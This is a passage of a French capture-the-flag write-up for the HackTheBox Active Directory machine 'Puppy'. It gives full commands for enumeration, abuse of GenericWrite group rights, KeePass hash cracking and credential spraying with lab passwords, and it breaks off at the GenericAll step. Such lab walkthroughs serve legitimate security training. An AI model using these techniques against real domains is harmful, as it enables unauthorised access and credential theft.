@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Puppy - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/puppy/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Puppy">
+  <meta property="og:description" content="Puppy est une machine Windows Active Directory de type assume-breach. Nous commençons donc avec les identifiants levi.james:KingofAkron2025!. Je commencerai par énumérer les partages, Levi.James n’ayant pas accès au partage DEV. Puis une récolte des relation entre les objets du domaine révèle qu’étant membre du groupe HR, il possède des privilèges GenericWrite sur le groupe Developers. En abusant de ces droits, je parviens à accéder au partage DEV dans lequel se trouve un fichier chiffré contenant des identifiants KeepassXC. Je trouverai alors des identifiants valides de Ant.Edwards. Ce dernier a les privilèges GenericAll sur Adam.Silver qui est désactivé. Après activation du compte Adam.Silver, j’abuse alors du privilège GenericAll ce qui me permet d’obtenir un shell en tant que ce dernier. Je trouve ensuite une sauvegarde LDAP contenant des identifiants de Steph.Cooper. Une fois connecté en tant que Steph.Cooper, je réalise une DPAPI qui me permet d’obtenir les identifiants de Steph.Cooper_adm membre du groupe Administrators et d’avoir une shell.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="GenericAll">
+    <meta property="article:tag" content="GenericWrite">
+    <meta property="article:tag" content="KeepassXC">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Puppy">
+  <meta name="twitter:description" content="Puppy est une machine Windows Active Directory de type assume-breach. Nous commençons donc avec les identifiants levi.james:KingofAkron2025!. Je commencerai par énumérer les partages, Levi.James n’ayant pas accès au partage DEV. Puis une récolte des relation entre les objets du domaine révèle qu’étant membre du groupe HR, il possède des privilèges GenericWrite sur le groupe Developers. En abusant de ces droits, je parviens à accéder au partage DEV dans lequel se trouve un fichier chiffré contenant des identifiants KeepassXC. Je trouverai alors des identifiants valides de Ant.Edwards. Ce dernier a les privilèges GenericAll sur Adam.Silver qui est désactivé. Après activation du compte Adam.Silver, j’abuse alors du privilège GenericAll ce qui me permet d’obtenir un shell en tant que ce dernier. Je trouve ensuite une sauvegarde LDAP contenant des identifiants de Steph.Cooper. Une fois connecté en tant que Steph.Cooper, je réalise une DPAPI qui me permet d’obtenir les identifiants de Steph.Cooper_adm membre du groupe Administrators et d’avoir une shell.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/puppy/" /><link rel="prev" href="http://localhost:1313/querier/" /><link rel="next" href="http://localhost:1313/outbound/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Puppy",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/puppy\/"
+        },"genre": "posts","keywords": "Medium, Windows, Active Directory, GenericAll, GenericWrite, KeepassXC, DPAPI","wordcount":  1125 ,
+        "url": "http:\/\/localhost:1313\/puppy\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Puppy</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;1125 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#énumération">Énumération</a>
+          <ul>
+            <li><a href="#nmap">Nmap</a></li>
+            <li><a href="#smb---tcp-445">SMB - TCP 445</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-as-adamsilver">Shell as Adam.Silver</a>
+          <ul>
+            <li><a href="#bloodhound">Bloodhound</a></li>
+            <li><a href="#genericwrite-on-developers-group">GenericWrite on Developers group</a></li>
+            <li><a href="#keepassxc">KeepassXC</a></li>
+            <li><a href="#genericall-on-adamsilver">GenericAll on Adam.Silver</a></li>
+            <li><a href="#enable-adamsilver">Enable Adam.Silver</a></li>
+            <li><a href="#evil-winrm">Evil-WinRM</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-as-stephcooper">Shell as Steph.Cooper</a>
+          <ul>
+            <li><a href="#backups">Backups</a></li>
+            <li><a href="#evil-winrm-1">Evil-WinRM</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-as-stephcooper_adm">Shell as Steph.Cooper_adm</a>
+          <ul>
+            <li><a href="#dpapi">DPAPI</a></li>
+            <li><a href="#evil-winrm-2">Evil-WinRM</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/puppy.png"
+        data-srcset="/images/Puppy/puppy.png, /images/Puppy/puppy.png 1.5x, /images/Puppy/puppy.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/puppy.png"
+        title="Puppy" width="645" height="312" /></p>
+<p><code>Puppy</code> est une machine Windows Active Directory de type assume-breach. Nous commençons donc avec les identifiants <code>levi.james:KingofAkron2025!</code>. Je commencerai par énumérer les partages, <code>Levi.James</code> n’ayant pas accès au partage <code>DEV</code>. Puis une récolte des relation entre les objets du domaine révèle qu’étant membre du groupe <code>HR</code>, il possède des privilèges <code>GenericWrite</code> sur le groupe <code>Developers</code>. En abusant de ces droits, je parviens à accéder au partage <code>DEV</code> dans lequel se trouve un fichier chiffré contenant des identifiants <code>KeepassXC</code>. Je trouverai alors des identifiants valides de <code>Ant.Edwards</code>. Ce dernier a les privilèges <code>GenericAll</code> sur <code>Adam.Silver</code> qui est désactivé. Après activation du compte <code>Adam.Silver</code>, j’abuse alors du privilège <code>GenericAll</code> ce qui me permet d’obtenir un shell en tant que ce dernier. Je trouve ensuite une sauvegarde LDAP contenant des identifiants de <code>Steph.Cooper</code>. Une fois connecté en tant que <code>Steph.Cooper</code>, je réalise une <code>DPAPI</code> qui me permet d’obtenir les identifiants de <code>Steph.Cooper_adm</code> membre du groupe <code>Administrators</code> et d’avoir une shell.</p>
+<h2 id="énumération">Énumération</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Un simple scan pour avoir les ports ouverts.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap 10.10.11.70 --min-rate <span class="m">5000</span> --top-port <span class="m">3500</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">53/tcp   open  domain
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec
+</span></span><span class="line"><span class="cl">111/tcp  open  rpcbind
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5
+</span></span><span class="line"><span class="cl">593/tcp  open  http-rpc-epmap
+</span></span><span class="line"><span class="cl">636/tcp  open  ldapssl
+</span></span><span class="line"><span class="cl">2049/tcp open  nfs
+</span></span><span class="line"><span class="cl">3260/tcp open  iscsi
+</span></span><span class="line"><span class="cl">3268/tcp open  globalcatLDAP
+</span></span><span class="line"><span class="cl">3269/tcp open  globalcatLDAPssl
+</span></span><span class="line"><span class="cl">5985/tcp open  wsman</span></span></code></pre></div></div>
+<p>Un scan en profondeur pour avoir plus de détails.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap 10.10.11.70 --min-rate <span class="m">5000</span> -sV -sC -p 53,88,111,135,139,389,445,464,593,636,2049,3260,3269,5985</span></span></code></pre></div></div>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-05-18 04:05:11Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">111/tcp  open  rpcbind?
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: PUPPY.HTB0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">2049/tcp open  mountd        1-3 <span class="o">(</span>RPC <span class="c1">#100005)</span>
+</span></span><span class="line"><span class="cl">3260/tcp open  iscsi?
+</span></span><span class="line"><span class="cl">3269/tcp open  tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 6h59m59s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-05-18T04:07:05
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required</span></span></code></pre></div></div>
+<p>J’ajoute ensuite le nom de domaine ainsi que le FQDN dans le fichier <code>/etc/hosts</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.11.70 puppy.htb dc.puppy.htb dc&#34;</span> <span class="p">|</span> tee -a /etc/hosts</span></span></code></pre></div></div>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<p>En listant les partages, je vois qu’il existe un nommé <code>DEV</code> mais <code>levi.james</code> n’y a pas accès.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.10.11.70 -u levi.james -p KingofAkron2025! --shares</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image.png"
+        data-srcset="/images/Puppy/image.png, /images/Puppy/image.png 1.5x, /images/Puppy/image.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image.png"
+        title="image.png" width="1798" height="341" /></p>
+<h2 id="shell-as-adamsilver">Shell as Adam.Silver</h2>
+<h3 id="bloodhound">Bloodhound</h3>
+<p>Je récolte les relations entre les différents objets du domaine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodhound-python -d puppy.htb -u levi.james -p <span class="s1">&#39;KingofAkron2025!&#39;</span> -ns 10.10.11.70 -c all --zip</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image1.png"
+        data-srcset="/images/Puppy/image1.png, /images/Puppy/image1.png 1.5x, /images/Puppy/image1.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image1.png"
+        title="image.png" width="1716" height="527" /></p>
+<h3 id="genericwrite-on-developers-group">GenericWrite on Developers group</h3>
+<p><code>levi.james</code> est membre du groupe <code>HR</code><strong>.</strong>  Ce groupe a le droit <code>GenericWrite</code> sur le groupe <code>Developers</code> <strong>.</strong>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image2.png"
+        data-srcset="/images/Puppy/image2.png, /images/Puppy/image2.png 1.5x, /images/Puppy/image2.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image2.png"
+        title="image.png" width="1370" height="640" /></p>
+<p>J’ajoute donc <code>levi.james</code> au sein du groupe <code>developers</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net rpc group addmem <span class="s2">&#34;developers&#34;</span> <span class="s2">&#34;levi.james&#34;</span> -U <span class="s2">&#34;puppy.htb&#34;</span>/<span class="s2">&#34;levi.james&#34;</span>%<span class="s1">&#39;KingofAkron2025!&#39;</span> -S <span class="s2">&#34;dc.puppy.htb&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image3.png"
+        data-srcset="/images/Puppy/image3.png, /images/Puppy/image3.png 1.5x, /images/Puppy/image3.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image3.png"
+        title="image.png" width="1389" height="155" /></p>
+<p>Avec la commande suivante, je vérifie qu’il a bien été ajouté. Je vois aussi que ce groupe contient trois autres utilisateurs.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net rpc group members <span class="s2">&#34;developers&#34;</span> -U <span class="s2">&#34;puppy.htb&#34;</span>/<span class="s2">&#34;levi.james&#34;</span>%<span class="s1">&#39;KingofAkron2025!&#39;</span> -S <span class="s2">&#34;dc.puppy.htb&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image4.png"
+        data-srcset="/images/Puppy/image4.png, /images/Puppy/image4.png 1.5x, /images/Puppy/image4.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image4.png"
+        title="image.png" width="1252" height="183" /></p>
+<p>Maintenant que <code>levi.james</code>, est membre du groupe <code>developers</code>, je vois qu’il a accès en lecture au partage <code>DEV</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.10.11.70 -u levi.james -p <span class="s1">&#39;KingofAkron2025!&#39;</span> --shares</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image5.png"
+        data-srcset="/images/Puppy/image5.png, /images/Puppy/image5.png 1.5x, /images/Puppy/image5.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image5.png"
+        title="image.png" width="1801" height="401" /></p>
+<h3 id="keepassxc">KeepassXC</h3>
+<p>Je me connecte au partage et s’y trouve un exécutable <code>KeepassXC</code> , un dossier <code>Projects</code> vide, ainsi qu’un fichier <code>recovery.kdbx</code> contenant surement des identifiants <code>KeepassXC</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbclient //puppy.htb/DEV -U <span class="s1">&#39;levi.james%KingofAkron2025!&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image6.png"
+        data-srcset="/images/Puppy/image6.png, /images/Puppy/image6.png 1.5x, /images/Puppy/image6.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image6.png"
+        title="image.png" width="1894" height="502" /></p>
+<p>Je vois que le fichier est protégé par un mot de passe.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image7.png"
+        data-srcset="/images/Puppy/image7.png, /images/Puppy/image7.png 1.5x, /images/Puppy/image7.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image7.png"
+        title="image.png" width="809" height="599" /></p>
+<p>Avec <code>keepass2john</code>, je récupère le hash du fichier. Puis avec <code>john</code>, je craque ce hash et je trouve alors le mot de passe <code>liverpool</code> .</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">keepass2john recovery.kdbx &gt; recovery.hash
+</span></span><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt recovery.hash</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image8.png"
+        data-srcset="/images/Puppy/image8.png, /images/Puppy/image8.png 1.5x, /images/Puppy/image8.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image8.png"
+        title="image.png" width="1161" height="455" /></p>
+<p>Dans ce fichier se trouvent bel et bien des identifiants.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image9.png"
+        data-srcset="/images/Puppy/image9.png, /images/Puppy/image9.png 1.5x, /images/Puppy/image9.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image9.png"
+        title="image.png" width="948" height="889" /></p>
+<p>Je les mets dans des fichiers et je teste les combinaisons valides</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.10.11.70 -u users.txt -p passwords.txt --continue-on-success</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image10.png"
+        data-srcset="/images/Puppy/image10.png, /images/Puppy/image10.png 1.5x, /images/Puppy/image10.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image10.png"
+        title="image.png" width="1801" height="617" /></p>
+<p>Je trouve alors une seule combinaison valide.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">User : ant.edwards
+</span></span><span class="line"><span class="cl">Password : Antman2025!</span></span></code></pre></div></div>
+<h3 id="genericall-on-adamsilver">GenericAll on Adam.Silver</h3>
+<p><code>ant.edwards</code> est membre du groupe <code>Senior devs</code> et possède le privilège <code>GenericAll</code> sur <code>adam.silver</code> ****. Ce qui luis permet de changer le mot de pase de Adam.Silver.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image11.png"
